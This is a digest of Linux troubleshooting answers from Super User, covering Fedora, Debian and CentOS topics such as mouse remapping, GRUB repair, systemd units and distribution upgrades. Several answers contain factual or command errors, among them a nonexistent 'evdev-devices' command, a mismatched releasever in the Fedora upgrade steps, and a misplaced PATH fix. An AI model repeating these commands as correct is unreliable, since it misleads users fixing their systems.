+Tags: linux, mouse, fedora, mouse-click, mouse-wheel | Score: 2 | Views: 496 | Answers: 1 | Created: 2025-08-08
+
+**解决方案 / Solution**:
+For reliable mouse wheel to left-click remapping on Fedora 42, I did some research on this topic and found some solutions that might work for you in this case. The first approach uses evemu with a Python script, which tends to handle fast scrolling better than input-remapper since it intercepts events at a lower level: # Install evemu sudo dnf install python3-evdev # Create a Python script (save as mouse_remap.py) #!/usr/bin/env python3 from evdev import InputDevice, categorize, ecodes, UInput import time # Find your mouse device (check with: sudo evdev-devices) dev = InputDevice('/dev/input/eventX') # Replace X with your mouse number ui = UInput() for event in dev.read_loop(): if event.type == ecodes.EV_REL and event.code == ecodes.REL_WHEEL: # Convert each scroll notch to a click if event.value != 0: # Mouse down ui.write(ecodes.EV_KEY, ecodes.BTN_LEFT, 1) ui.syn() time.sleep(0.01) # Small delay # Mouse up ui.write(ecodes.EV_KEY, ecodes.BTN_LEFT, 0) ui.syn() else: # Pass through other events ui.write_event(event) ui.syn() Run with: sudo python3 mouse_remap.py Alternatively, if you're using X11, you could try xbindkeys with xdotool , though this might not be as responsive with rapid scrolling: # Install required tools sudo dnf install xbindkeys xdotool xev # Create ~/.xbindkeysrc echo '"xdotool click 1" b:4 "xdotool click 1" b:5' > ~/.xbindkeysrc # Start xbindkeys xbindkeys The evemu approach should handle fast scrolling more reliably since it processes events before they reach the desktop environment, avoiding the timing issues you experienced.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1916491/how-do-i-remap-mouse-left-click-to-mouse-scroll-wheel-on-fedora-42
+
+---
+
+#### 3067. Grub stuck on the minimal BASH-like line editing after a power interruption (debian 13)
+
+**问题描述 / Problem Description**:
+Tags: debian, grub, gpt, efi, lvm | Score: 2 | Views: 500 | Answers: 2 | Created: 2025-08-08
+
+**解决方案 / Solution**:
+Most likely, drive corruption is causing the issue, rather than an issue with grub . The quickest and easiest way to fix such corruption, I find, is to do the following: Shut down. Use shutdown -h now , poweroff or systemctl poweroff . If that fails, hold down the power button. Insert a USB (or CD) drive with Debian live test/installation. Hold down the key to select boot device, or for BIOS, power on while holding the key, and select the Debian boot device. Then start the PC to boot from USB. Choose to try Debian, not install. Then, either Use the Disks utility to repair each partition Or use File System Consistency Check (fsck) to repair each partition. N.B., I've often seen a message for failure of the repair on the first attempt. However, repeating the identical procedure reports success on the second try. Sorry, I've no explanation as to why a second pass works, but it most often does . Shut down gracefully, remove the boot media, and boot again. Hopefully, all will be well. If there is an actual problem with grub , after trying to fix partitions, try Boot-Repair or, if that fails, GrubEFIReinstall , using the Debian live installation media. BTW, if Boot-Repair is not already on that media, add it in Terminal as follows: sudo apt install -y wget; wget -O- https://sourceforge.net/projects/boot-repair/files/key.gpg | sudo tee /etc/apt/keyrings/boot-repair.gpg; echo 'deb [signed-by=/etc/apt/keyrings/boot-repair.gpg] https://ppa.launchpadcontent.net/yannubuntu/boot-repair/ubuntu noble main' | sudo tee /etc/apt/sources.list.d/boot-repair.list; sudo apt update && sudo apt install -y boot-repair Note that this is a Ubuntu noble (v. 24.04) tool, but it should work on recent Debian versions.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1916480/grub-stuck-on-the-minimal-bash-like-line-editing-after-a-power-interruption-deb
+
+---
+
+#### 3068. Why am I getting this message with USB-to-Ethernet adapter inside USB-C Hub: Temporary failure in name resolution?
+
+**问题描述 / Problem Description**:
+Tags: networking, debian, dns, ip, ethernet | Score: 2 | Views: 218 | Answers: 2 | Created: 2025-08-06
+
+**解决方案 / Solution**:
+To verify that it is truly a DNS resolution issue, rather than a failure to communicate, ping a server by IP address , rather than by name: e.g., ping 74.6.143.25 for one of the Yahoo servers, or better, a public site allowing ping, such as DNS resolver Cloudflare ( 1.1.1.1 ) or Google ( 8.8.8.8 ), or any other external server (not necessarily a DNS resolution server) you can reach from another PC on your network, such as Microsoft.com by IP address . Also check if your machine can ping another IP inside your local area network , such as your router . If you cannot even ping on the LAN, then the issue is clearly failure to communicate at all.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1916063/why-am-i-getting-this-message-with-usb-to-ethernet-adapter-inside-usb-c-hub-tem
+
+---
+
+#### 3069. What is an "extended boot partition?"
+
+**问题描述 / Problem Description**:
+Tags: boot, partitioning, fedora | Score: 2 | Views: 880 | Answers: 2 | Created: 2025-07-31
+
+**解决方案 / Solution**:
+Windows does not support Ext4 (not counting a janky third-party driver). Thus an Ext4 partition cannot be a Windows boot partition. Generally /boot is just a regular boot partition for Linux. Distributions make it a dedicated partition so that it could use a simpler filesystem than the whole of / – that way, even if your bootloader (GRUB) cannot directly understand e.g. a fancy ZFS-based / , it is enough for it to be able to load the kernel from an ordinary Ext4-based /boot . This convention predates EFI. In a way, /boot is similar to the EFI System Partition, and indeed often the same partition serves both purposes. But many distributions avoid such sharing and deliberately keep /boot separate from the ESP, as modern Linux kernels can simply be too large to fit within a generic Windows-factory-created ESP.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1914218/what-is-an-extended-boot-partition
+
+---
+
+#### 3070. How to programmatically determine if APT is doing an update?
+
+**问题描述 / Problem Description**:
+Tags: debian, shell-script, updates, apt, widgets | Score: 2 | Views: 303 | Answers: 2 | Created: 2025-06-30
+
+**解决方案 / Solution**:
+Apt locks files using flock() . This means that the file will open the file, call flock on the descriptor, and as result of flock it will get if another file has it, or if they have succesfully got the lock. To detect if a lock has being hold, you can do lsof /var/lib/dpkg/lock-frontend or similar. (Make sure to run this as root, it will exit with status 1 quietly if not run as root) I am unsure if it is possible to get the current state, you should probably be able to use the output of apt if you are using it in your own script.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1907799/how-to-programmatically-determine-if-apt-is-doing-an-update
+
+---
+
+#### 3071. Tor log file doesn't exist on Debian - how to enable?
+
+**问题描述 / Problem Description**:
+Tags: debian, tor | Score: 2 | Views: 726 | Answers: 1 | Created: 2025-04-19
+
+**解决方案 / Solution**:
+You need to edit the /etc/tor/torrc file to enable logs (uncomment the below line). Log notice file /var/log/tor/notices.log Please also note : We advise using "notice" in most cases, since anything more verbose may provide sensitive information to an attacker who obtains the logs. Then, just restart the tor service like this : sudo systemctl restart tor From now, you should be able to monitor and view tor logs : sudo tail -f /var/log/tor/notices.log
+
+**参考链接 / References**:
+- https://superuser.com/questions/1892860/tor-log-file-doesnt-exist-on-debian-how-to-enable
+
+---
+
+#### 3072. Linux service can only do network request, if restarted with sudo priviledges?
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, debian, services, systemd, systemctl | Score: 2 | Views: 74 | Answers: 1 | Created: 2025-04-18
+
+**解决方案 / Solution**:
+I had to add 2 lines to the Unit section. Found that out literally 5 minutes after setting up a bounty after days. [Unit] After=network-online.target Wants=network-online.target Seems that even if the network comes online with time, the service will not have access to it, if it does not wait for it.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1892713/linux-service-can-only-do-network-request-if-restarted-with-sudo-priviledges
+
+---
+
+#### 3073. How to check all URLs from requests still being processed by Apache on CentOS?
+
+**问题描述 / Problem Description**:
+Tags: apache-http-server, centos, httpd | Score: 2 | Views: 217 | Answers: 1 | Created: 2025-03-17
+
+**解决方案 / Solution**:
+To monitor currently active HTTP requests including their URLs in Apache on CentOS, the most direct solution is to use Apache's mod_status module. This module can show you active connections, statuses and the full request including the query string.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1886833/how-to-check-all-urls-from-requests-still-being-processed-by-apache-on-centos
+
+---
+
+#### 3074. How to install Linux on the device it booted from?
+
+**问题描述 / Problem Description**:
+Tags: linux, hard-drive, installation, fedora, anaconda | Score: 2 | Views: 179 | Answers: 1 | Created: 2025-03-11
+
+**解决方案 / Solution**:
+Add rd.live.ram=1 to the boot arguments. If you use UEFI boot, press e and append this to the end of the linux line, if BIOS, press TAB and append to kernel line.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1885454/how-to-install-linux-on-the-device-it-booted-from
+
+---
+
+#### 3075. Will DNF also upgrade my installation of PostgreSQL 16?
+
+**问题描述 / Problem Description**:
+Tags: fedora, postgresql, dnf | Score: 2 | Views: 329 | Answers: 1 | Created: 2024-08-20
+
+**解决方案 / Solution**:
+dnf will update minor versions only i.e. 17.2 to 17.4 These are binary compatible, the update will ensure security patches etc. are applied.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1852913/will-dnf-also-upgrade-my-installation-of-postgresql-16
+
+---
+
+#### 3076. Emacs top bar doesn't follow system theme in Fedora
+
+**问题描述 / Problem Description**:
+Tags: fedora, emacs, gnome, themes, dark-mode | Score: 2 | Views: 715 | Answers: 1 | Created: 2024-06-30
+
+**解决方案 / Solution**:
+If you're not able to do custom color preference edits, I was able to get the Emacs GUI (the GUI window/not the background of the terminal) to enter a dark mode using gnome-tweaks in Gnome. On the Appearance tab, next to Legacy Applications, select Adwaita-dark . It seems that Emacs relies on this Legacy implementation and won't follow some theme selections, so you might need to find a route like this one. Adwaita-dark worked well and the GUI window updates immediately when it is selected from the Legacy Applications menu. I'd love to hear the explanation of why this works from someone more knowledgeable.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1847595/emacs-top-bar-doesnt-follow-system-theme-in-fedora
+
+---
+
+#### 3077. How to properly use bluetooth dongle in Fedora 39
+
+**问题描述 / Problem Description**:
+Tags: linux, mouse, fedora, bluetooth, dongle | Score: 2 | Views: 499 | Answers: 1 | Created: 2024-04-21
+
+**解决方案 / Solution**:
+If anyone lands here. Check out this link to work with several dongles. FYI: the mouse problems I mention in my question are resovled by the lates sudo dnf update command. Actually, the bluez package got updated and included a fix.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1839869/how-to-properly-use-bluetooth-dongle-in-fedora-39
+
+---
+
+#### 3078. How to disable Ctrl+Shift+u keyboard shortcut (unicode-selector) in Fedora 39 KDE-Spin (Wayland)
+
+**问题描述 / Problem Description**:
+Tags: fedora, shortcuts, kde, unicode, wayland | Score: 2 | Views: 658 | Answers: 1 | Created: 2023-12-24
+
+**解决方案 / Solution**:
+KDE usually ships with the fcitx5 input method. To configure, try System Settings -> Input Method -> configure addons (near the bottom) Look for Unicode. You can rebind this by clicking the configure button, or check Show Advance options at the bottom and disable it.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1822967/how-to-disable-ctrlshiftu-keyboard-shortcut-unicode-selector-in-fedora-39-kd
+
+---
+
+#### 3079. Installing keytool without JDK
+
+**问题描述 / Problem Description**:
+Tags: linux, centos, java, docker, centos-7 | Score: 2 | Views: 11096 | Answers: 1 | Created: 2023-08-06
+
+**解决方案 / Solution**:
+You may use an alternative to keytool. For example : KeyStore Explorer .
+
+**参考链接 / References**:
+- https://superuser.com/questions/1802826/installing-keytool-without-jdk
+
+---
+
+#### 3080. How can I prevent a file owner from using chmod to elevate permissions on a file?
+
+**问题描述 / Problem Description**:
+Tags: linux, apache-http-server, centos, file-permissions | Score: 2 | Views: 6745 | Answers: 1 | Created: 2023-07-12
+
+**解决方案 / Solution**:
+The only way to prevent a file from being modified by the owner is to prevent that user from being logged in as the file's owner. This means creating an admin account and a user account, so that user is a single user, and any file that might be created is created by the admin entity. Using Octal Notation Syntax with chmod Each digit is independent of the other two. -400: The first digit 4 means (r) read-only for the owner of the file. The second and third digits do not give any permissions to other users/groups. -600: The first digit 6 means (rw) the owner of the file has full read and write access, the second and third digits do not give any permissions to other users/groups more info... https://www.linode.com/docs/guides/modify-file-permissions-with-chmod/
+
+**参考链接 / References**:
+- https://superuser.com/questions/1795686/how-can-i-prevent-a-file-owner-from-using-chmod-to-elevate-permissions-on-a-file
+
+---
+
+#### 3081. How can I enable streaming (flush/ob_flush) in CentOS 8 stream with PHP-FPM?
+
+**问题描述 / Problem Description**:
+Tags: centos, php, fastcgi, fpm | Score: 2 | Views: 300 | Answers: 1 | Created: 2023-07-12
+
+**解决方案 / Solution**:
+This is not an answer to the question, but a (temporary) work-around: disable PHP-FPM and switch back to mod_php . In CentOS 8, this is fairly simple, in /etc/httpd/conf.modules.d/00-mpm.conf , uncomment this line: LoadModule mpm_prefork_module modules/mod_mpm_prefork.so and comment out the line for mpm_event . Then add this to httpd.conf : <IfModule prefork.c> StartServers 5 MinSpareServers 5 MaxSpareServers 10 MaxRequestWorkers 150 MaxConnectionsPerChild 0 </IfModule> Source: https://www.linode.com/docs/guides/how-to-install-apache-web-server-centos-8/
+
+**参考链接 / References**:
+- https://superuser.com/questions/1795648/how-can-i-enable-streaming-flush-ob-flush-in-centos-8-stream-with-php-fpm
+
+---
+
+#### 3082. What happened to my X fonts? The newer OS has a "weaker" font weight for "Monospace 10"
+
+**问题描述 / Problem Description**:
+Tags: centos, fonts, xorg, fontconfig, font-faces | Score: 2 | Views: 468 | Answers: 1 | Created: 2023-06-23
+
+**解决方案 / Solution**:
+Ah, ha! It is a different font. You can resolve font names using fc-match Monospace . On el7: ]$ fc-match Monospace DejaVuSansMono.ttf: "DejaVu Sans Mono" "Book" On OL9: # fc-match Monospace NimbusMonoPS-Regular.otf: "Nimbus Mono PS" "Regular" So I used fc-list to figure out where it was packaged: # fc-list |grep DejaVuSansMono.ttf: /usr/share/fonts/dejavu/DejaVuSansMono.ttf: DejaVu Sans Mono:style=Book # rpm -qf /usr/share/fonts/dejavu/DejaVuSansMono.ttf dejavu-sans-mono-fonts-2.33-6.el7.noarch and ultimately installed dejavu-sans-mono-fonts on OL9 and not my fonts look great!
+
+**参考链接 / References**:
+- https://superuser.com/questions/1790771/what-happened-to-my-x-fonts-the-newer-os-has-a-weaker-font-weight-for-monosp
+
+---
+
+#### 3083. CentOS | Bash process is using a lot of ram in idle state (more than 3GB)
+
+**问题描述 / Problem Description**:
+Tags: bash, memory, centos, process | Score: 2 | Views: 237 | Answers: 2 | Created: 2023-01-19
+
+**解决方案 / Solution**:
+I'm not sure if this constitutes an answer, but if not, hopefully its at least a partial answer - and besides its to big to be a comment - Use ps aux | awk '{print $6/1024 " MB\t " $2 "\t" $11}' | sort -n | grep "bash" To additionally show the PID of the bash process. Then use pstree -show-pids Which should show a process tree including the PID's,and may help you to find what, if any children are consuming the memory related to the PID of the bash process thats a problem.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1763686/centos-bash-process-is-using-a-lot-of-ram-in-idle-state-more-than-3gb
+
+---
+
+#### 3084. LibreOffice headless HTML to DOCX: images gone without a trace
+
+**问题描述 / Problem Description**:
+Tags: debian, html, libreoffice-writer, headless, docx | Score: 1 | Views: 74 | Answers: 2 | Created: 2026-04-16
+
+**解决方案 / Solution**:
+You could try to inline the images into the html file before conversion. I.e. embed them as data URI. With a helper script like #!/bin/bash html_file="$1" while read -r img_path; do if [[ -f "$img_path" ]]; then mime_type=$(file -b --mime-type "$img_path") data_uri="data:$mime_type;base64,$(base64 < "$img_path" | tr -d '\n')" sed -i "s|src=\"$img_path\"|src=\"$data_uri\"|g" "$html_file" fi done < <(grep -oP 'src="\K[^"]*' "$html_file")
+
+**参考链接 / References**:
+- https://superuser.com/questions/1936786/libreoffice-headless-html-to-docx-images-gone-without-a-trace
+
+---
+
+#### 3085. Why does searching an email address via grep on this site not give any results?
+
+**问题描述 / Problem Description**:
+Tags: bash, email, grep, url, screen-scraping | Score: 1 | Views: 1837 | Answers: 2 | Created: 2026-03-08
+
+**解决方案 / Solution**:
+You won't be able to do it easily for hundreds of URLs. Websites implement security measures for displayed emails to prevent: spamming scam attempts scraping to mass databases While this one, which seems to be just dynamically loaded with help of JavaScript, might be obtainable with headless browser or tool like Puppeteer , the question is almost impossible to answer for a large number of websites . They might use various type of security to remove/obfuscate/change the email address or not let you get contents of the website at all. Here are some examples: user agent verification checking of various window/navigator JavaScript properties missing/undesired headers tons of other fingerprinting methods just being behind Cloudflare can cause you massive CLI access troubles, depending on protection level This subject is wide and way beyond a single answer here, you will need to learn a scraping tool and master it with tons of available materials regarding this topic.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1935663/why-does-searching-an-email-address-via-grep-on-this-site-not-give-any-results
+
+---
+
+#### 3086. Why are Flatpak icons missing even after restart?
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, icons, bug, flatpak | Score: 1 | Views: 153 | Answers: 1 | Created: 2026-02-23
+
+**解决方案 / Solution**:
+If your Flatpak icons aren't showing up even after a reboot, your environment is likely failing to source the Flatpak export paths (check for warnings in sudo flatpak repair ). This is often due to permission issues or a broken profile script. To fix it, manually add the export directory /var/lib/flatpak/exports/share to your PATH
+
+**参考链接 / References**:
+- https://superuser.com/questions/1935213/why-are-flatpak-icons-missing-even-after-restart
+
+---
+
+#### 3087. Why am I getting "Too many levels of symbolic links" mount error on specific system combination with Samba?
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, samba | Score: 1 | Views: 70 | Answers: 1 | Created: 2026-02-20
+
+**解决方案 / Solution**:
+This problem seems to be specific for that Kernel range. But it can be circumvented for a share when the option msdfs root = no. One has to be careful as there are global and share specific settings. Maybe also check with testparm.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1935119/why-am-i-getting-too-many-levels-of-symbolic-links-mount-error-on-specific-sys
+
+---
+
+#### 3088. Why is /usr/local/bin not in my PATH?
+
+**问题描述 / Problem Description**:
+Tags: linux, debian, path, lxc, proxmox | Score: 1 | Views: 285 | Answers: 1 | Created: 2026-01-08
+
+**解决方案 / Solution**:
+From https://dimasmaulana.dev/posts/development/bash-check-if-shell-on-interactive-or-login/ Bash Check if Shell on Interactive or Login In Bash, you can check whether the shell is running in an interactive or login mode using the provided commands. Here’s an explanation of each command and what it checks for: [[ $- == *i* ]] && echo 'Interactive' || echo 'Not interactive' : This command checks the value of the special shell variable $- , which contains a string of options and flags that are currently set for the shell. The *i* pattern is used to check if the letter ‘i’ appears anywhere in the value of $- . If it does, it indicates that the shell is running in interactive mode. If ‘i’ is found, it echoes ‘Interactive’, otherwise, it echoes ‘Not interactive’. shopt -q login_shell && echo 'Login shell' || echo 'Not login shell' : This command uses the shopt built-in command to check the status of a shell option called login_shell . If shopt -q login_shell returns true (exit status 0), it means that the shell is a login shell, so it echoes ‘Login shell’. If shopt -q login_shell returns false (exit status non-zero), it means that the shell is not a login shell, so it echoes ‘Not login shell’. From https://blog.vandenakker.xyz/posts/whats-the-difference-between-a-login-and-a-nonlogin-shell/ Is My Current Shell a Login Shell? There are two ways to check if your current shell is a login shell: First, you can check the output of echo $0 : if it starts with a dash (like -bash ), it’s a login shell. Be aware, however, that you can start a login shell with bash --login , and echo $0 will output just bash without the leading dash, so this is not a surefire way of find out if you are running a login shell. Secondly, the Unix StackOverflow offers this way of finding out : $ shopt -q login_shell && echo login || echo nonlogin Why You Sometimes Want a Login Shell When you switch users using su you will take the environment of the calling user with you. To prevent this, you should use su - which is short for su --login . This acts like a clean login for a new user, so the environment will not be cluttered with values from the calling user. Just as before, a login shell will read /etc/profile and the .bash_profile of the user you are switching to, but not its .bashrc . This post on StackOverflow shows why you might want to prefer to start with a clean environment (spoiler: your $PATH might be “poisoned”).
+
+**参考链接 / References**:
+- https://superuser.com/questions/1933431/why-is-usr-local-bin-not-in-my-path
+
+---
+
+#### 3089. Why am I unable to find and select a Dell Inspiron 7506s SSD to install Linux from a USB flash drive?
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, linux-mint, dell-inspiron | Score: 1 | Views: 110 | Answers: 1 | Created: 2025-12-23
+
+**解决方案 / Solution**:
+So, this is the answer on how I got to finally install Linux Mint 22.2 -- after I googled the error it gave me, and followed the steps to stop the drives. So I followed the usual steps of trying to install and failing and I googled the error and got this AI generated response: The suggestion that worked for me was "3. RAID Array". Below is the screenshot of the before and after: Then the installer was able to see half of the drive: 512 GB in total. So I went ahead with the install and now I use Linux Mint from the hard drive. Thank you very much all for your helpful suggestions. While I am here, I also want to go ahead and list some of the BIOS settings when I finally got here: Boot Configuration > Secure Boot > Enable Secure Boot : OFF (was ON originally) Boot Configuration > Secure Boot Mode: Deployed Mode Boot Configuration > Expert Key Management > Enable Custom Mode: OFF Storage > SATA/NVMe Operation > Operation Mode: AHCI/NMVe (was RAID On originally) Storage > Storage Interface > Port Enablement > M.2 PCIe SSD: ON Security > Intel Platform Trust Technology: OFF Security > SMM Security Mitigation: OFF Security > Absolute: Disabled Security > UEFI Boot Path Security: Never
+
+**参考链接 / References**:
+- https://superuser.com/questions/1932802/why-am-i-unable-to-find-and-select-a-dell-inspiron-7506s-ssd-to-install-linux-fr
+
+---
+
+#### 3090. Login loop Fedora 43 KDE Plasma w/ nvidia gpu
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, nvidia-graphics-card, kde | Score: 1 | Views: 328 | Answers: 1 | Created: 2025-12-16
+
+**解决方案 / Solution**:
+You just need to select Plasma (X11) on the login screen. Then your NVIDIA GPU will work properly, SDDM will not crash, and your games should run smoothly.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1932532/login-loop-fedora-43-kde-plasma-w-nvidia-gpu
+
+---
+
+#### 3091. How to clone an SSD with Fedora 43 on a BTRFS partition?
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, disk-cloning | Score: 1 | Views: 309 | Answers: 1 | Created: 2025-11-09
+
+**解决方案 / Solution**:
+The dd command copies everything, including the filesystem UUID. Since both drives now have the same BTRFS UUID, your system gets confused and shows it as "unknown." You're on the right track with btrfs send/receive. First, you'll need to create a new BTRFS filesystem on the target partition (mkfs.btrfs), then use btrfs send | btrfs receiveto copy the data. This will generate a new UUID for the clone, which is what you want. Just remember to update your /etc/fstaband bootloader on the external drive to use the new BTRFS partition's UUID afterward.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1929941/how-to-clone-an-ssd-with-fedora-43-on-a-btrfs-partition
+
+---
+
+#### 3092. How to configure QTCreator to use bash-language-server?
+
+**问题描述 / Problem Description**:
+Tags: bash, qt, msys2 | Score: 1 | Views: 54 | Answers: 1 | Created: 2025-10-23
+
+**解决方案 / Solution**:
+For all systems, you must specify "start" as the argument. For windows, rather than using sh and passing in the path to the script, instead use the .cmd version of bash-language-server . Note that on Windows it will only work partially, as there is no ShellCheck for MSYS2.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1927138/how-to-configure-qtcreator-to-use-bash-language-server
+
+---
+
+#### 3093. Why is pasting into Nano editor via SSH so painfully slow or even hanging without recovery?
+
+**问题描述 / Problem Description**:
+Tags: linux, bash, ssh | Score: 1 | Views: 313 | Answers: 1 | Created: 2025-09-19
+
+**解决方案 / Solution**:
+Yes, large pastes into a terminal can be lost partway through. I have seen it for remote servers tens of milliseconds away, although network latency is not the only factor in the problem. A text mode editor is sending characters through the terminal system. This has input buffering separate from file buffer on stdin, or any network buffer for ssh over IP. An obscure C library function to set various parameters is tcsetattr , although I instead remember on Linux man stdin . Input is line by line, and if a buffer is exceeded input is discarded. Plus other complications on how I/O works. It is code designed for humans typing, doesn't always work the best when sent many KB all at once. Which editor you use is a complicating factor. Some do terminal control with readline functions, others roll their own. Maybe try a different editor just to see if the terminal behaves better in this situation. For example vim, remember :set paste to turn formatting off. Most effective way around the problem is to not paste more than maybe 1000 characters into a terminal over ssh. Remote copy files: sftp over ssh, curl over https. Once they are local, you can copy and manipulate how you like. As the contents in this case is shell profile things like aliases, could set things up so that you can drop in files, and not have to edit them to integrate with what is already there. Also is much easier to automate. On Red Hat, /etc/profile.d/*.sh has a few shell drop-ins for various purposes. Or you could script something similar to source ~/.profile.d/*.sh or whatever.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1925021/why-is-pasting-into-nano-editor-via-ssh-so-painfully-slow-or-even-hanging-withou
+
+---
+
+#### 3094. Disabling the Kate Scrolling Mini-Map
+
+**问题描述 / Problem Description**:
+Tags: debian, text-editors, scrollbar, kate | Score: 1 | Views: 152 | Answers: 1 | Created: 2025-09-04
+
+**解决方案 / Solution**:
+The way to disable the Scrollbar Mini-Map with Kate version 25.04.3 is to access the menu and go to View > Borders > Scrollbar Mini-Map. There you can toggle it on or off. Also in Settings > Configure Kate > Borders > Minimap: Show minimap
+
+**参考链接 / References**:
+- https://superuser.com/questions/1923398/disabling-the-kate-scrolling-mini-map
+
+---
+
+#### 3095. How do I verify the authenticity of software downloaded from the Ubuntu App Center/Snap?
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, debian, security, snap | Score: 1 | Views: 347 | Answers: 1 | Created: 2025-08-25
+
+**解决方案 / Solution**:
+From my own reading the App Center is a front for both Snap and apt . I have been unable to find any information on how to use publisher's certs to validate software within the system. Also, given that you can add repos, I would guess that the App Center can probably use these too, so even assuming the default repos are generally trustworthy, you can add untrusted repos. Given the above, the Ubuntu App Center appears to be "General User" focused and should only be used on unmodified systems with default repos, and then should not be trusted beyond the normal level of trust accorded to software you download online. If trust and safety is your goal, use the other package management tools that support cryptographic publisher confirmation and package validation.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1921133/how-do-i-verify-the-authenticity-of-software-downloaded-from-the-ubuntu-app-cent
+
+---
+
+#### 3096. How to release/renew IP address on Debian 13?
+
+**问题描述 / Problem Description**:
+Tags: debian, ip, dhcp | Score: 1 | Views: 5560 | Answers: 1 | Created: 2025-08-10
+
+**解决方案 / Solution**:
+On Debian 13, I was able to use dhcpcd dhcpcd --release {iface name like eth0} dhcpcd --renew {iface name like eth0}
+
+**参考链接 / References**:
+- https://superuser.com/questions/1916993/how-to-release-renew-ip-address-on-debian-13
+
+---
+
+#### 3097. How to completely power off Windows SSD when booting into Linux and vice versa?
+
+**问题描述 / Problem Description**:
+Tags: linux, windows, boot, ssd, fedora | Score: 1 | Views: 147 | Answers: 1 | Created: 2025-07-30
+
+**解决方案 / Solution**:
+If BIOS has a setting to disable a drive, that is likely the most secure way to prevent accidentally writing to it. Use Windows Power Options to turn off a HDD (not SSD) after a certain length of inactivity. Use sudo hdparm -y /dev/sda to turn off a drive in Linux, You can also put each OS on external SSD's, and remove the internal one. Whether doing any of these would save enough power to be worth the trouble is questionable.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1913977/how-to-completely-power-off-windows-ssd-when-booting-into-linux-and-vice-versa
+
+---
+
+#### 3098. Why is an older Linux binary failing on newer system with “/lib/arm-linux-gnueabihf/libpthread.so.0: version `GLIBC_2.25' not found?”
+
+**问题描述 / Problem Description**:
+Tags: debian, glibc, shared-libraries | Score: 1 | Views: 236 | Answers: 1 | Created: 2025-07-29
+
+**解决方案 / Solution**:
+The (dynamic) linker is capable of finding compat symbols where available, glibc naturally was an early adopter. This is why the linker might know about version GLIBC_2.25 when the .so name of the file did not change. glibc 2.34 merged the tightly integrated yet separate libpthread into libc . Although newer glibc like the host system will have a libpthread.so.0, nothing but placeholders are in there. This should be fine; it's either in one place or the other. On my Fedora box with glibc 2.40, there are no 2.25 versioned symbols when I run readelf -W -s /usr/lib64/libpthread.so.0 /lib64/libc.so.6 | grep pthread Use the linker debugger environment variables to find out how every symbol is resolved. LD_DEBUG_OUTPUT=/tmp/ld.txt LD_DEBUG=all ./Demo An output file will be in /tmp/ld.txt postfixed with PID. (Or do not set LD_DEBUG_OUTPUT and it's then printed on stderr.) Find every GLIBC_2.25 versioned symbol and how it was resolved. symbol= lines when it first appears, and lookup in file= for the search path. Note if the search path is for the host or the target libraries. Also try the programs on a glibc less than 2.34, such as Debian bullseye. On such systems, readelf -W -s libpthread.so.0 will show the actual symbols of the pthread implementation. If that also does find GLIBC_2.25, your problem is not specific to the pthread merge.
+
+**参考链接 / References**:
+- https://superuser.com/questions/1913743/why-is-an-older-linux-binary-failing-on-newer-system-with-lib-arm-linux-gnueab
+
+---
+
+#### 3099. Systemd: service to stop main service, run housekeeping then restart main service
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, systemd | Score: 1 | Views: 297 | Answers: 1 | Created: 2025-07-15
+
+**解决方案 / Solution**:
+Units can "chain" to a different unit using OnFailure= and OnSuccess= settings. (The former exists in all relevant systemd versions, but the latter requires systemd v249.) So you might be able to achieve this using: [Unit] Conflicts=main.service OnFailure=main.service OnSuccess=main.service
+
+**参考链接 / References**:
+- https://superuser.com/questions/1910773/systemd-service-to-stop-main-service-run-housekeeping-then-restart-main-servic
+
+---
+
+#### 3100. How to mount a USB drive as a user with systemd mount?
+
+**问题描述 / Problem Description**:
+Tags: linux, mount, fedora, systemd, user | Score: 1 | Views: 557 | Answers: 1 | Created: 2025-07-08
+
+**解决方案 / Solution**:
+The man page for systemd.mount states: When invoked in this way, mount(8) does not read any options from /etc/fstab, and must be run as UID 0. --user units run as the user that started them, not UID 0, so you may not use a --user unit to mount a drive, and unfortunately for you, it appears this is the case regardless of if the mount type is fuse . mount (and by extension /etc/fstab ) have options to mount a drive as a specific user, with specific access ( man page ): uid=n, gid=n Set the owner and group of the mountpoint. You could use these options in a fstab entry or in a systemd unit file (they're the same thing anyway), and since this would be run by root, you may also forgo fuse entirely. Read more: Mount device with specific user rights
+
+**参考链接 / References**:
+- https://superuser.com/questions/1909452/how-to-mount-a-usb-drive-as-a-user-with-systemd-mount
+
+---
+
+#### 3101. How can I upgrade my WSL2 Fedora subsystem from FC40 to FC42?
+
+**问题描述 / Problem Description**:
+Tags: linux, fedora, wsl2 | Score: 1 | Views: 1128 | Answers: 2 | Created: 2025-06-16
+
+**解决方案 / Solution**:
+Following instructions from this page I just now successfully updated 39 -> 40 -> 41 -> 42. sudo dnf upgrade --refresh sudo dnf install dnf-plugin-system-upgrade sudo dnf system-upgrade download --releasever=37 export DNF_SYSTEM_UPGRADE_NO_REBOOT=1 sudo -E dnf system-upgrade reboot sudo -E dnf system-upgrade upgrade sudo dnf upgrade --refresh although as noted in a comment sudo -E dnf system-upgrade upgrade does not work from Fedora 41 and the alternative is sudo -E dnf offline _execute .
+
+**参考链接 / References**:
+- https://superuser.com/questions/1905344/how-can-i-upgrade-my-wsl2-fedora-subsystem-from-fc40-to-fc42
+
+---
+
